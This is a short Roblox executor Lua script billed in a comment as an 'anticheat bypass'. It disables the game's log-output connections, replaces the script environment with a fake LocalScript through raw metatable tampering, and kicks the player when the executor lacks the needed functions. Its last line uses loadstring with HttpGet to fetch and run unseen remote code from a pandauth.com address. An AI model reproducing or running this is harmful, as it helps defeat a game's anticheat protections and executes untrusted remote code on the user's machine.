--bbz
if getconnections then
	local FunctionDisabled = false
	local Timeout = os.clock()
	repeat
		print(math.random(1, 10000))
		task.wait()
		for i, v in next, getconnections(game:GetService("LogService").MessageOut) do
			if v.Function == nil then
				FunctionDisabled = true
				v:Disable()
			end
		end
	until FunctionDisabled == true or os.clock() - Timeout >= 10
end
if getrenv then
	local fake = getrenv()
	local fakescript = Instance.new("LocalScript")
	fakescript.Enabled = false
	fakescript.Parent = game:GetService("Players").LocalPlayer.PlayerScripts
	local rget = rawget
	local mt = getrawmetatable(getfenv(1))
	local idx = mt.__index
	local gi = getinfo
	local log = print
	
	setrawmetatable(getfenv(1), {
		__index = function(a, b)
			if gi(2, "s").short_src == "" then
				return idx[b]
			end
			if b == "script" then
				return fakescript
			end
			return rget(fake, b)
		end
	})
else
	game:GetService("Players").LocalPlayer:Kick("yo executor dont support ts game")
end
--yes anticheat bypass real
loadstring(game:HttpGet("https://vss.pandauth.com/virtual/file/85d3fddbfe9b45a3"))()
